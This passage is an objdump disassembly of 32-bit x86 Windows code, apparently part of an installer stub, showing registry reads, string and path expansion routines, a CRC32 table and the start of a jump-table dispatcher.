  405e06:	eb 12                	jmp    0x405e1a
  405e08:	ff 75 14             	push   0x14(%ebp)
  405e0b:	ff 75 10             	push   0x10(%ebp)
  405e0e:	6a 00                	push   $0x0
  405e10:	ff 75 0c             	push   0xc(%ebp)
  405e13:	50                   	push   %eax
  405e14:	ff 15 08 70 40 00    	call   *0x407008
  405e1a:	5d                   	pop    %ebp
  405e1b:	c2 10 00             	ret    $0x10
  405e1e:	55                   	push   %ebp
  405e1f:	8b ec                	mov    %esp,%ebp
  405e21:	8d 45 10             	lea    0x10(%ebp),%eax
  405e24:	50                   	push   %eax
  405e25:	ff 75 08             	push   0x8(%ebp)
  405e28:	e8 48 ff ff ff       	call   0x405d75
  405e2d:	33 c9                	xor    %ecx,%ecx
  405e2f:	3b c1                	cmp    %ecx,%eax
  405e31:	75 05                	jne    0x405e38
  405e33:	6a 06                	push   $0x6
  405e35:	58                   	pop    %eax
  405e36:	eb 15                	jmp    0x405e4d
  405e38:	51                   	push   %ecx
  405e39:	ff 75 14             	push   0x14(%ebp)
  405e3c:	51                   	push   %ecx
  405e3d:	ff 75 10             	push   0x10(%ebp)
  405e40:	51                   	push   %ecx
  405e41:	51                   	push   %ecx
  405e42:	51                   	push   %ecx
  405e43:	ff 75 0c             	push   0xc(%ebp)
  405e46:	50                   	push   %eax
  405e47:	ff 15 04 70 40 00    	call   *0x407004
  405e4d:	5d                   	pop    %ebp
  405e4e:	c2 10 00             	ret    $0x10
  405e51:	55                   	push   %ebp
  405e52:	8b ec                	mov    %esp,%ebp
  405e54:	51                   	push   %ecx
  405e55:	8d 45 18             	lea    0x18(%ebp),%eax
  405e58:	56                   	push   %esi
  405e59:	50                   	push   %eax
  405e5a:	8b 45 18             	mov    0x18(%ebp),%eax
  405e5d:	f7 d8                	neg    %eax
  405e5f:	1b c0                	sbb    %eax,%eax
  405e61:	c7 45 fc 00 04 00 00 	movl   $0x400,-0x4(%ebp)
  405e68:	25 00 01 00 00       	and    $0x100,%eax
  405e6d:	0d 19 00 02 00       	or     $0x20019,%eax
  405e72:	50                   	push   %eax
  405e73:	ff 75 0c             	push   0xc(%ebp)
  405e76:	ff 75 08             	push   0x8(%ebp)
  405e79:	e8 72 ff ff ff       	call   0x405df0
  405e7e:	8b 75 14             	mov    0x14(%ebp),%esi
  405e81:	85 c0                	test   %eax,%eax
  405e83:	75 3b                	jne    0x405ec0
  405e85:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405e88:	57                   	push   %edi
  405e89:	50                   	push   %eax
  405e8a:	8d 45 0c             	lea    0xc(%ebp),%eax
  405e8d:	56                   	push   %esi
  405e8e:	50                   	push   %eax
  405e8f:	6a 00                	push   $0x0
  405e91:	ff 75 10             	push   0x10(%ebp)
  405e94:	ff 75 18             	push   0x18(%ebp)
  405e97:	ff 15 2c 70 40 00    	call   *0x40702c
  405e9d:	ff 75 18             	push   0x18(%ebp)
  405ea0:	8b f8                	mov    %eax,%edi
  405ea2:	ff 15 24 70 40 00    	call   *0x407024
  405ea8:	80 a6 ff 03 00 00 00 	andb   $0x0,0x3ff(%esi)
  405eaf:	85 ff                	test   %edi,%edi
  405eb1:	5f                   	pop    %edi
  405eb2:	75 0c                	jne    0x405ec0
  405eb4:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  405eb8:	74 09                	je     0x405ec3
  405eba:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  405ebe:	74 03                	je     0x405ec3
  405ec0:	80 26 00             	andb   $0x0,(%esi)
  405ec3:	5e                   	pop    %esi
  405ec4:	c9                   	leave
  405ec5:	c2 14 00             	ret    $0x14
  405ec8:	ff 74 24 08          	push   0x8(%esp)
  405ecc:	68 a4 73 40 00       	push   $0x4073a4
  405ed1:	ff 74 24 0c          	push   0xc(%esp)
  405ed5:	ff 15 74 72 40 00    	call   *0x407274
  405edb:	83 c4 0c             	add    $0xc,%esp
  405ede:	c2 08 00             	ret    $0x8
  405ee1:	55                   	push   %ebp
  405ee2:	8b ec                	mov    %esp,%ebp
  405ee4:	51                   	push   %ecx
  405ee5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405ee8:	53                   	push   %ebx
  405ee9:	56                   	push   %esi
  405eea:	57                   	push   %edi
  405eeb:	33 ff                	xor    %edi,%edi
  405eed:	80 39 2d             	cmpb   $0x2d,(%ecx)
  405ef0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405ef7:	b0 0a                	mov    $0xa,%al
  405ef9:	b3 39                	mov    $0x39,%bl
  405efb:	75 05                	jne    0x405f02
  405efd:	41                   	inc    %ecx
  405efe:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405f02:	80 39 30             	cmpb   $0x30,(%ecx)
  405f05:	75 1c                	jne    0x405f23
  405f07:	41                   	inc    %ecx
  405f08:	8a 11                	mov    (%ecx),%dl
  405f0a:	80 fa 30             	cmp    $0x30,%dl
  405f0d:	7c 09                	jl     0x405f18
  405f0f:	80 fa 37             	cmp    $0x37,%dl
  405f12:	7f 04                	jg     0x405f18
  405f14:	b0 08                	mov    $0x8,%al
  405f16:	b3 37                	mov    $0x37,%bl
  405f18:	80 e2 df             	and    $0xdf,%dl
  405f1b:	80 fa 58             	cmp    $0x58,%dl
  405f1e:	75 03                	jne    0x405f23
  405f20:	b0 10                	mov    $0x10,%al
  405f22:	41                   	inc    %ecx
  405f23:	0f be 11             	movsbl (%ecx),%edx
  405f26:	41                   	inc    %ecx
  405f27:	83 fa 30             	cmp    $0x30,%edx
  405f2a:	7c 0c                	jl     0x405f38
  405f2c:	0f be f3             	movsbl %bl,%esi
  405f2f:	3b d6                	cmp    %esi,%edx
  405f31:	7f 05                	jg     0x405f38
  405f33:	83 ea 30             	sub    $0x30,%edx
  405f36:	eb 19                	jmp    0x405f51
  405f38:	3c 10                	cmp    $0x10,%al
  405f3a:	75 21                	jne    0x405f5d
  405f3c:	8b f2                	mov    %edx,%esi
  405f3e:	83 e6 df             	and    $0xffffffdf,%esi
  405f41:	83 fe 41             	cmp    $0x41,%esi
  405f44:	7c 17                	jl     0x405f5d
  405f46:	83 fe 46             	cmp    $0x46,%esi
  405f49:	7f 12                	jg     0x405f5d
  405f4b:	83 e2 07             	and    $0x7,%edx
  405f4e:	83 c2 09             	add    $0x9,%edx
  405f51:	0f be f0             	movsbl %al,%esi
  405f54:	0f af f7             	imul   %edi,%esi
  405f57:	03 f2                	add    %edx,%esi
  405f59:	8b fe                	mov    %esi,%edi
  405f5b:	eb c6                	jmp    0x405f23
  405f5d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405f60:	0f af c7             	imul   %edi,%eax
  405f63:	5f                   	pop    %edi
  405f64:	5e                   	pop    %esi
  405f65:	5b                   	pop    %ebx
  405f66:	c9                   	leave
  405f67:	c2 04 00             	ret    $0x4
  405f6a:	68 00 04 00 00       	push   $0x400
  405f6f:	ff 74 24 0c          	push   0xc(%esp)
  405f73:	ff 74 24 0c          	push   0xc(%esp)
  405f77:	ff 15 a4 70 40 00    	call   *0x4070a4
  405f7d:	c2 08 00             	ret    $0x8
  405f80:	ff 25 98 70 40 00    	jmp    *0x407098
  405f86:	ff 25 e0 70 40 00    	jmp    *0x4070e0
  405f8c:	55                   	push   %ebp
  405f8d:	8b ec                	mov    %esp,%ebp
  405f8f:	83 ec 18             	sub    $0x18,%esp
  405f92:	8b 45 0c             	mov    0xc(%ebp),%eax
  405f95:	85 c0                	test   %eax,%eax
  405f97:	7d 11                	jge    0x405faa
  405f99:	8b 0d dc 2e 42 00    	mov    0x422edc,%ecx
  405f9f:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  405fa6:	2b c8                	sub    %eax,%ecx
  405fa8:	8b 01                	mov    (%ecx),%eax
  405faa:	8b 0d 58 37 42 00    	mov    0x423758,%ecx
  405fb0:	53                   	push   %ebx
  405fb1:	56                   	push   %esi
  405fb2:	57                   	push   %edi
  405fb3:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  405fb6:	b8 a0 26 42 00       	mov    $0x4226a0,%eax
  405fbb:	39 45 08             	cmp    %eax,0x8(%ebp)
  405fbe:	8b f8                	mov    %eax,%edi
  405fc0:	0f 82 eb 01 00 00    	jb     0x4061b1
  405fc6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405fc9:	2b c8                	sub    %eax,%ecx
  405fcb:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  405fd1:	0f 83 da 01 00 00    	jae    0x4061b1
  405fd7:	8b 7d 08             	mov    0x8(%ebp),%edi
  405fda:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  405fde:	e9 ce 01 00 00       	jmp    0x4061b1
  405fe3:	8b cf                	mov    %edi,%ecx
  405fe5:	2b c8                	sub    %eax,%ecx
  405fe7:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  405fed:	0f 8d c8 01 00 00    	jge    0x4061bb
  405ff3:	43                   	inc    %ebx
  405ff4:	80 fa 04             	cmp    $0x4,%dl
  405ff7:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  405ffa:	0f 83 a4 01 00 00    	jae    0x4061a4
  406000:	0f be 43 01          	movsbl 0x1(%ebx),%eax
  406004:	0f be 0b             	movsbl (%ebx),%ecx
  406007:	8b f0                	mov    %eax,%esi
  406009:	8b d9                	mov    %ecx,%ebx
  40600b:	83 e6 7f             	and    $0x7f,%esi
  40600e:	83 e3 7f             	and    $0x7f,%ebx
  406011:	c1 e6 07             	shl    $0x7,%esi
  406014:	0b f3                	or     %ebx,%esi
  406016:	8b d9                	mov    %ecx,%ebx
  406018:	80 cf 80             	or     $0x80,%bh
  40601b:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40601e:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  406021:	8b d8                	mov    %eax,%ebx
  406023:	80 cf 80             	or     $0x80,%bh
  406026:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406029:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40602c:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40602f:	43                   	inc    %ebx
  406030:	43                   	inc    %ebx
  406031:	80 fa 02             	cmp    $0x2,%dl
  406034:	0f 85 17 01 00 00    	jne    0x406151
  40603a:	a1 0c 37 42 00       	mov    0x42370c,%eax
  40603f:	6a 02                	push   $0x2
  406041:	85 c0                	test   %eax,%eax
  406043:	5e                   	pop    %esi
  406044:	79 18                	jns    0x40605e
  406046:	66 3d 04 5a          	cmp    $0x5a04,%ax
  40604a:	74 12                	je     0x40605e
  40604c:	83 7d f4 23          	cmpl   $0x23,-0xc(%ebp)
  406050:	74 0c                	je     0x40605e
  406052:	83 7d f4 2e          	cmpl   $0x2e,-0xc(%ebp)
  406056:	74 06                	je     0x40605e
  406058:	83 65 0c 00          	andl   $0x0,0xc(%ebp)
  40605c:	eb 07                	jmp    0x406065
  40605e:	c7 45 0c 01 00 00 00 	movl   $0x1,0xc(%ebp)
  406065:	83 3d a4 37 42 00 00 	cmpl   $0x0,0x4237a4
  40606c:	74 03                	je     0x406071
  40606e:	6a 04                	push   $0x4
  406070:	5e                   	pop    %esi
  406071:	84 c9                	test   %cl,%cl
  406073:	79 37                	jns    0x4060ac
  406075:	8b c1                	mov    %ecx,%eax
  406077:	83 e1 3f             	and    $0x3f,%ecx
  40607a:	03 0d 58 37 42 00    	add    0x423758,%ecx
  406080:	83 e0 40             	and    $0x40,%eax
  406083:	50                   	push   %eax
  406084:	57                   	push   %edi
  406085:	51                   	push   %ecx
  406086:	68 a8 73 40 00       	push   $0x4073a8
  40608b:	68 02 00 00 80       	push   $0x80000002
  406090:	e8 bc fd ff ff       	call   0x405e51
  406095:	80 3f 00             	cmpb   $0x0,(%edi)
  406098:	0f 85 9a 00 00 00    	jne    0x406138
  40609e:	ff 75 f4             	push   -0xc(%ebp)
  4060a1:	57                   	push   %edi
  4060a2:	e8 e5 fe ff ff       	call   0x405f8c
  4060a7:	e9 87 00 00 00       	jmp    0x406133
  4060ac:	83 f9 25             	cmp    $0x25,%ecx
  4060af:	75 0e                	jne    0x4060bf
  4060b1:	68 00 04 00 00       	push   $0x400
  4060b6:	57                   	push   %edi
  4060b7:	ff 15 e4 70 40 00    	call   *0x4070e4
  4060bd:	eb 74                	jmp    0x406133
  4060bf:	83 f9 24             	cmp    $0x24,%ecx
  4060c2:	75 6b                	jne    0x40612f
  4060c4:	68 00 04 00 00       	push   $0x400
  4060c9:	57                   	push   %edi
  4060ca:	ff 15 b0 70 40 00    	call   *0x4070b0
  4060d0:	33 f6                	xor    %esi,%esi
  4060d2:	eb 5b                	jmp    0x40612f
  4060d4:	a1 04 37 42 00       	mov    0x423704,%eax
  4060d9:	33 c9                	xor    %ecx,%ecx
  4060db:	4e                   	dec    %esi
  4060dc:	3b c1                	cmp    %ecx,%eax
  4060de:	74 18                	je     0x4060f8
  4060e0:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  4060e3:	74 13                	je     0x4060f8
  4060e5:	57                   	push   %edi
  4060e6:	51                   	push   %ecx
  4060e7:	51                   	push   %ecx
  4060e8:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  4060ec:	ff 35 08 37 42 00    	push   0x423708
  4060f2:	ff d0                	call   *%eax
  4060f4:	85 c0                	test   %eax,%eax
  4060f6:	74 3b                	je     0x406133
  4060f8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4060fb:	50                   	push   %eax
  4060fc:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  406100:	ff 35 08 37 42 00    	push   0x423708
  406106:	ff 15 68 71 40 00    	call   *0x407168
  40610c:	85 c0                	test   %eax,%eax
  40610e:	75 1c                	jne    0x40612c
  406110:	57                   	push   %edi
  406111:	ff 75 fc             	push   -0x4(%ebp)
  406114:	ff 15 70 71 40 00    	call   *0x407170
  40611a:	ff 75 fc             	push   -0x4(%ebp)
  40611d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406120:	ff 15 8c 72 40 00    	call   *0x40728c
  406126:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40612a:	75 07                	jne    0x406133
  40612c:	80 27 00             	andb   $0x0,(%edi)
  40612f:	85 f6                	test   %esi,%esi
  406131:	75 a1                	jne    0x4060d4
  406133:	80 3f 00             	cmpb   $0x0,(%edi)
  406136:	74 11                	je     0x406149
  406138:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  40613c:	75 0b                	jne    0x406149
  40613e:	68 d4 73 40 00       	push   $0x4073d4
  406143:	57                   	push   %edi
  406144:	e8 3d fe ff ff       	call   0x405f86
  406149:	57                   	push   %edi
  40614a:	e8 85 00 00 00       	call   0x4061d4
  40614f:	eb 44                	jmp    0x406195
  406151:	80 fa 03             	cmp    $0x3,%dl
  406154:	75 2e                	jne    0x406184
  406156:	83 fe 1d             	cmp    $0x1d,%esi
  406159:	75 0e                	jne    0x406169
  40615b:	ff 35 08 37 42 00    	push   0x423708
  406161:	57                   	push   %edi
  406162:	e8 61 fd ff ff       	call   0x405ec8
  406167:	eb 11                	jmp    0x40617a
  406169:	8b c6                	mov    %esi,%eax
  40616b:	c1 e0 0a             	shl    $0xa,%eax
  40616e:	05 00 40 42 00       	add    $0x424000,%eax
  406173:	50                   	push   %eax
  406174:	57                   	push   %edi
  406175:	e8 f0 fd ff ff       	call   0x405f6a
  40617a:	83 c6 eb             	add    $0xffffffeb,%esi
  40617d:	83 fe 07             	cmp    $0x7,%esi
  406180:	73 13                	jae    0x406195
  406182:	eb c5                	jmp    0x406149
  406184:	80 fa 01             	cmp    $0x1,%dl
  406187:	75 0c                	jne    0x406195
  406189:	83 c8 ff             	or     $0xffffffff,%eax
  40618c:	2b c6                	sub    %esi,%eax
  40618e:	50                   	push   %eax
  40618f:	57                   	push   %edi
  406190:	e8 f7 fd ff ff       	call   0x405f8c
  406195:	57                   	push   %edi
  406196:	e8 e5 fd ff ff       	call   0x405f80
  40619b:	03 f8                	add    %eax,%edi
  40619d:	b8 a0 26 42 00       	mov    $0x4226a0,%eax
  4061a2:	eb 0d                	jmp    0x4061b1
  4061a4:	75 08                	jne    0x4061ae
  4061a6:	8a 0b                	mov    (%ebx),%cl
  4061a8:	88 0f                	mov    %cl,(%edi)
  4061aa:	47                   	inc    %edi
  4061ab:	43                   	inc    %ebx
  4061ac:	eb 03                	jmp    0x4061b1
  4061ae:	88 17                	mov    %dl,(%edi)
  4061b0:	47                   	inc    %edi
  4061b1:	8a 13                	mov    (%ebx),%dl
  4061b3:	84 d2                	test   %dl,%dl
  4061b5:	0f 85 28 fe ff ff    	jne    0x405fe3
  4061bb:	80 27 00             	andb   $0x0,(%edi)
  4061be:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4061c2:	5f                   	pop    %edi
  4061c3:	5e                   	pop    %esi
  4061c4:	5b                   	pop    %ebx
  4061c5:	74 09                	je     0x4061d0
  4061c7:	50                   	push   %eax
  4061c8:	ff 75 08             	push   0x8(%ebp)
  4061cb:	e8 9a fd ff ff       	call   0x405f6a
  4061d0:	c9                   	leave
  4061d1:	c2 08 00             	ret    $0x8
  4061d4:	53                   	push   %ebx
  4061d5:	56                   	push   %esi
  4061d6:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4061da:	57                   	push   %edi
  4061db:	80 3e 5c             	cmpb   $0x5c,(%esi)
  4061de:	75 15                	jne    0x4061f5
  4061e0:	80 7e 01 5c          	cmpb   $0x5c,0x1(%esi)
  4061e4:	75 0f                	jne    0x4061f5
  4061e6:	80 7e 02 3f          	cmpb   $0x3f,0x2(%esi)
  4061ea:	75 09                	jne    0x4061f5
  4061ec:	80 7e 03 5c          	cmpb   $0x5c,0x3(%esi)
  4061f0:	75 03                	jne    0x4061f5
  4061f2:	83 c6 04             	add    $0x4,%esi
  4061f5:	80 3e 00             	cmpb   $0x0,(%esi)
  4061f8:	74 0c                	je     0x406206
  4061fa:	56                   	push   %esi
  4061fb:	e8 6f f7 ff ff       	call   0x40596f
  406200:	85 c0                	test   %eax,%eax
  406202:	74 02                	je     0x406206
  406204:	46                   	inc    %esi
  406205:	46                   	inc    %esi
  406206:	8a 06                	mov    (%esi),%al
  406208:	8b de                	mov    %esi,%ebx
  40620a:	84 c0                	test   %al,%al
  40620c:	8b fe                	mov    %esi,%edi
  40620e:	74 39                	je     0x406249
  406210:	55                   	push   %ebp
  406211:	8b 2d 30 72 40 00    	mov    0x407230,%ebp
  406217:	3c 1f                	cmp    $0x1f,%al
  406219:	76 22                	jbe    0x40623d
  40621b:	50                   	push   %eax
  40621c:	68 d0 93 40 00       	push   $0x4093d0
  406221:	e8 07 f7 ff ff       	call   0x40592d
  406226:	80 38 00             	cmpb   $0x0,(%eax)
  406229:	75 12                	jne    0x40623d
  40622b:	56                   	push   %esi
  40622c:	ff d5                	call   *%ebp
  40622e:	2b c6                	sub    %esi,%eax
  406230:	50                   	push   %eax
  406231:	56                   	push   %esi
  406232:	57                   	push   %edi
  406233:	e8 86 f8 ff ff       	call   0x405abe
  406238:	57                   	push   %edi
  406239:	ff d5                	call   *%ebp
  40623b:	8b f8                	mov    %eax,%edi
  40623d:	56                   	push   %esi
  40623e:	ff d5                	call   *%ebp
  406240:	8b f0                	mov    %eax,%esi
  406242:	8a 06                	mov    (%esi),%al
  406244:	84 c0                	test   %al,%al
  406246:	75 cf                	jne    0x406217
  406248:	5d                   	pop    %ebp
  406249:	80 27 00             	andb   $0x0,(%edi)
  40624c:	57                   	push   %edi
  40624d:	53                   	push   %ebx
  40624e:	ff 15 e8 71 40 00    	call   *0x4071e8
  406254:	8b f8                	mov    %eax,%edi
  406256:	8a 07                	mov    (%edi),%al
  406258:	3c 20                	cmp    $0x20,%al
  40625a:	74 04                	je     0x406260
  40625c:	3c 5c                	cmp    $0x5c,%al
  40625e:	75 07                	jne    0x406267
  406260:	80 27 00             	andb   $0x0,(%edi)
  406263:	3b df                	cmp    %edi,%ebx
  406265:	72 e5                	jb     0x40624c
  406267:	5f                   	pop    %edi
  406268:	5e                   	pop    %esi
  406269:	5b                   	pop    %ebx
  40626a:	c2 04 00             	ret    $0x4
  40626d:	56                   	push   %esi
  40626e:	be 58 15 42 00       	mov    $0x421558,%esi
  406273:	56                   	push   %esi
  406274:	ff 74 24 0c          	push   0xc(%esp)
  406278:	ff 15 28 71 40 00    	call   *0x407128
  40627e:	83 f8 ff             	cmp    $0xffffffff,%eax
  406281:	74 0b                	je     0x40628e
  406283:	50                   	push   %eax
  406284:	ff 15 3c 71 40 00    	call   *0x40713c
  40628a:	8b c6                	mov    %esi,%eax
  40628c:	eb 02                	jmp    0x406290
  40628e:	33 c0                	xor    %eax,%eax
  406290:	5e                   	pop    %esi
  406291:	c2 04 00             	ret    $0x4
  406294:	55                   	push   %ebp
  406295:	8b ec                	mov    %esp,%ebp
  406297:	81 ec 20 01 00 00    	sub    $0x120,%esp
  40629d:	56                   	push   %esi
  40629e:	be 04 01 00 00       	mov    $0x104,%esi
  4062a3:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4062a9:	56                   	push   %esi
  4062aa:	50                   	push   %eax
  4062ab:	ff 15 e4 70 40 00    	call   *0x4070e4
  4062b1:	3b c6                	cmp    %esi,%eax
  4062b3:	5e                   	pop    %esi
  4062b4:	76 02                	jbe    0x4062b8
  4062b6:	33 c0                	xor    %eax,%eax
  4062b8:	85 c0                	test   %eax,%eax
  4062ba:	74 0e                	je     0x4062ca
  4062bc:	80 bc 05 df fe ff ff 	cmpb   $0x5c,-0x121(%ebp,%eax,1)
  4062c3:	5c 
  4062c4:	74 04                	je     0x4062ca
  4062c6:	33 c9                	xor    %ecx,%ecx
  4062c8:	eb 03                	jmp    0x4062cd
  4062ca:	33 c9                	xor    %ecx,%ecx
  4062cc:	41                   	inc    %ecx
  4062cd:	ff 75 08             	push   0x8(%ebp)
  4062d0:	8d 89 14 90 40 00    	lea    0x409014(%ecx),%ecx
  4062d6:	8d 84 05 e0 fe ff ff 	lea    -0x120(%ebp,%eax,1),%eax
  4062dd:	51                   	push   %ecx
  4062de:	68 dc 93 40 00       	push   $0x4093dc
  4062e3:	50                   	push   %eax
  4062e4:	ff 15 74 72 40 00    	call   *0x407274
  4062ea:	83 c4 10             	add    $0x10,%esp
  4062ed:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4062f3:	6a 08                	push   $0x8
  4062f5:	6a 00                	push   $0x0
  4062f7:	50                   	push   %eax
  4062f8:	ff 15 50 71 40 00    	call   *0x407150
  4062fe:	c9                   	leave
  4062ff:	c2 04 00             	ret    $0x4
  406302:	8b 44 24 04          	mov    0x4(%esp),%eax
  406306:	56                   	push   %esi
  406307:	8b f0                	mov    %eax,%esi
  406309:	57                   	push   %edi
  40630a:	c1 e6 03             	shl    $0x3,%esi
  40630d:	8b be 40 92 40 00    	mov    0x409240(%esi),%edi
  406313:	57                   	push   %edi
  406314:	ff 15 54 71 40 00    	call   *0x407154
  40631a:	85 c0                	test   %eax,%eax
  40631c:	75 0a                	jne    0x406328
  40631e:	57                   	push   %edi
  40631f:	e8 70 ff ff ff       	call   0x406294
  406324:	85 c0                	test   %eax,%eax
  406326:	74 0f                	je     0x406337
  406328:	ff b6 44 92 40 00    	push   0x409244(%esi)
  40632e:	50                   	push   %eax
  40632f:	ff 15 e8 70 40 00    	call   *0x4070e8
  406335:	eb 02                	jmp    0x406339
  406337:	33 c0                	xor    %eax,%eax
  406339:	5f                   	pop    %edi
  40633a:	5e                   	pop    %esi
  40633b:	c2 04 00             	ret    $0x4
  40633e:	55                   	push   %ebp
  40633f:	8b ec                	mov    %esp,%ebp
  406341:	83 ec 1c             	sub    $0x1c,%esp
  406344:	56                   	push   %esi
  406345:	8b 75 08             	mov    0x8(%ebp),%esi
  406348:	57                   	push   %edi
  406349:	8b 3d f0 71 40 00    	mov    0x4071f0,%edi
  40634f:	eb 0a                	jmp    0x40635b
  406351:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406354:	50                   	push   %eax
  406355:	ff 15 ec 71 40 00    	call   *0x4071ec
  40635b:	6a 01                	push   $0x1
  40635d:	56                   	push   %esi
  40635e:	56                   	push   %esi
  40635f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406362:	6a 00                	push   $0x0
  406364:	50                   	push   %eax
  406365:	ff d7                	call   *%edi
  406367:	85 c0                	test   %eax,%eax
  406369:	75 e6                	jne    0x406351
  40636b:	5f                   	pop    %edi
  40636c:	5e                   	pop    %esi
  40636d:	c9                   	leave
  40636e:	c2 04 00             	ret    $0x4
  406371:	ff 25 e8 70 40 00    	jmp    *0x4070e8
  406377:	55                   	push   %ebp
  406378:	8b ec                	mov    %esp,%ebp
  40637a:	51                   	push   %ecx
  40637b:	56                   	push   %esi
  40637c:	8b 35 f0 70 40 00    	mov    0x4070f0,%esi
  406382:	57                   	push   %edi
  406383:	6a 64                	push   $0x64
  406385:	ff 75 08             	push   0x8(%ebp)
  406388:	ff d6                	call   *%esi
  40638a:	bf 02 01 00 00       	mov    $0x102,%edi
  40638f:	eb 0e                	jmp    0x40639f
  406391:	6a 0f                	push   $0xf
  406393:	e8 a6 ff ff ff       	call   0x40633e
  406398:	6a 64                	push   $0x64
  40639a:	ff 75 08             	push   0x8(%ebp)
  40639d:	ff d6                	call   *%esi
  40639f:	3b c7                	cmp    %edi,%eax
  4063a1:	74 ee                	je     0x406391
  4063a3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4063a6:	50                   	push   %eax
  4063a7:	ff 75 08             	push   0x8(%ebp)
  4063aa:	ff 15 ec 70 40 00    	call   *0x4070ec
  4063b0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4063b3:	5f                   	pop    %edi
  4063b4:	5e                   	pop    %esi
  4063b5:	c9                   	leave
  4063b6:	c2 04 00             	ret    $0x4
  4063b9:	83 3d 9c 22 42 00 00 	cmpl   $0x0,0x42229c
  4063c0:	56                   	push   %esi
  4063c1:	75 2d                	jne    0x4063f0
  4063c3:	33 c9                	xor    %ecx,%ecx
  4063c5:	6a 08                	push   $0x8
  4063c7:	8b c1                	mov    %ecx,%eax
  4063c9:	5e                   	pop    %esi
  4063ca:	8b d0                	mov    %eax,%edx
  4063cc:	80 e2 01             	and    $0x1,%dl
  4063cf:	f6 da                	neg    %dl
  4063d1:	1b d2                	sbb    %edx,%edx
  4063d3:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  4063d9:	d1 e8                	shr    $1,%eax
  4063db:	33 c2                	xor    %edx,%eax
  4063dd:	4e                   	dec    %esi
  4063de:	75 ea                	jne    0x4063ca
  4063e0:	89 04 8d 98 22 42 00 	mov    %eax,0x422298(,%ecx,4)
  4063e7:	41                   	inc    %ecx
  4063e8:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4063ee:	7c d5                	jl     0x4063c5
  4063f0:	8b 54 24 10          	mov    0x10(%esp),%edx
  4063f4:	8b 44 24 08          	mov    0x8(%esp),%eax
  4063f8:	85 d2                	test   %edx,%edx
  4063fa:	f7 d0                	not    %eax
  4063fc:	76 23                	jbe    0x406421
  4063fe:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406402:	57                   	push   %edi
  406403:	0f b6 39             	movzbl (%ecx),%edi
  406406:	8b f0                	mov    %eax,%esi
  406408:	81 e6 ff 00 00 00    	and    $0xff,%esi
  40640e:	33 f7                	xor    %edi,%esi
  406410:	c1 e8 08             	shr    $0x8,%eax
  406413:	8b 34 b5 98 22 42 00 	mov    0x422298(,%esi,4),%esi
  40641a:	33 c6                	xor    %esi,%eax
  40641c:	41                   	inc    %ecx
  40641d:	4a                   	dec    %edx
  40641e:	75 e3                	jne    0x406403
  406420:	5f                   	pop    %edi
  406421:	f7 d0                	not    %eax
  406423:	5e                   	pop    %esi
  406424:	c2 0c 00             	ret    $0xc
  406427:	b8 80 00 00 00       	mov    $0x80,%eax
  40642c:	48                   	dec    %eax
  40642d:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406431:	75 f9                	jne    0x40642c
  406433:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406437:	33 c0                	xor    %eax,%eax
  406439:	40                   	inc    %eax
  40643a:	89 41 68             	mov    %eax,0x68(%ecx)
  40643d:	89 41 64             	mov    %eax,0x64(%ecx)
  406440:	89 41 60             	mov    %eax,0x60(%ecx)
  406443:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406446:	c3                   	ret
  406447:	55                   	push   %ebp
  406448:	8b ec                	mov    %esp,%ebp
  40644a:	81 ec 90 00 00 00    	sub    $0x90,%esp
  406450:	53                   	push   %ebx
  406451:	56                   	push   %esi
  406452:	57                   	push   %edi
  406453:	6a 22                	push   $0x22
  406455:	8b f1                	mov    %ecx,%esi
  406457:	59                   	pop    %ecx
  406458:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  40645e:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  406464:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406466:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  40646a:	75 08                	jne    0x406474
  40646c:	33 c0                	xor    %eax,%eax
  40646e:	40                   	inc    %eax
  40646f:	e9 20 0a 00 00       	jmp    0x406e94
  406474:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406477:	8b 75 ac             	mov    -0x54(%ebp),%esi
  40647a:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  406480:	83 f8 1c             	cmp    $0x1c,%eax
  406483:	0f 87 08 0a 00 00    	ja     0x406e91
  406489:	ff 24 85 99 6e 40 00 	jmp    *0x406e99(,%eax,4)
